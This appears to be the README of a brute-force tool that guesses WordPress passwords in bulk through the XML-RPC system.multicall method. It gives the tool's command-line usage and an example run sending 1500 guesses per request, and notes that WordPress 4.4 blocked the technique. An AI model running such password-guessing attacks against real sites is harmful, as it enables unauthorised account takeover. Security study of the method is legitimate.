# WordPress XML-RPC Brute Force Amplification Attack

This script uses a vulnerability discovered in the XML-RPC implementation in WordPress to brute force user accounts. This allows for amplification of hundreds (or thousands) of requests per individual HTTP(s) request. For more details on the attack, see the related blog post on [sucuri.net](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html).

**NOTE**: As of WordPress 4.4, this amplification method no longer works. All `system.multicall` requests via XML-RPC fail after the first authentication failure. See https://core.trac.wordpress.org/ticket/34336 for more details.

## Usage

```
usage: wpxmlrpcbrute.py [-h] [-c COUNT] [-t THREADS] [-u USER] [-l LEVEL]
                        url wordlist

positional arguments:
  url                   URL of WordPress site to brute force
  wordlist              Path of the password list to use

optional arguments:
  -h, --help            show this help message and exit
  -c COUNT, --count COUNT
                        Number of passwords to send in each request. Default:
                        100
  -t THREADS, --threads THREADS
                        Number of threads to spawn. Default: 4
  -u USER, --user USER  WordPress username to brute force. Default: admin
  -l LEVEL, --level LEVEL
                        Log level (1-5). 1 = debug, 5 = critical. Default: 1
```

### Examples

``` bash
$ ./wpxmlrpcbrute.py -c 1500 -u admin http://example.com/ wordlists/grimwepa_pw.txt
```

## TODO

 - Exception handling within threads
 - Better feedback in UI. Debug log output works, but it isn't so clean.
 - Track number of total requests and attempts
